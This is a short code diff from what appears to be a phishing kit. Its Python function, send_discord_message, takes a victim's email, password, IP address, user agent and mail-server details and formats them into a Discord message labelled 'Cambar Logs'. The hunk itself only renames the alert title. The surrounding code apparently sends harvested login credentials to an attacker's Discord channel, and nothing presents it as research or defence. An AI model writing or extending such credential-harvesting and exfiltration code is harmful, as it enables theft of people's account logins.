@@ -30,7 +30,7 @@ def send_discord_message(email, password, ip, useragent, domain, mx_record):
         "username": "Cambar Logs",
         "embeds": [
             {
-                "title": "🔔 CAMBAR Login⭐⭐⭐",
+                "title": "🔔 CAMBAR General Login⭐⭐⭐",
                 "color": 16711680,  # Red color in Discord embed
                 "fields": [
                     {"name": "📧 Email", "value": f"`{email}`", "inline": False},
